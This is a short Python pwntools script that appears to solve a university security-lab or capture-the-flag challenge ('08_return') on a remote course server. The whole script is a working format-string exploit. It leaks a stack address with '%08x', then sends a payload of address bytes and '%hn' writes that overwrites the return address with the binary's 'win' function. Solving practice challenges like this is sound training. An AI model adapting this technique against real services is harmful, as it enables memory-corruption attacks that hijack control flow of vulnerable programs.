from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23198

s = remote(SERVER, PORT, timeout=9999)
elf = ELF("./08_return")
s.sendline("%08x")
response = s.recvline()
s.close()

s = remote(SERVER, PORT, timeout=9999)

win_address = elf.sym["win"]
return_address = int("0x" + response.decode()[:-1], 16) + 144

s.sendline(
    p32(return_address)
    + p32(return_address + 2)
    + b"%37358x"
    + b"%7$hn"
    + b"%30222x"
    + b"%8$hn"
)

response = s.clean()
print(response)
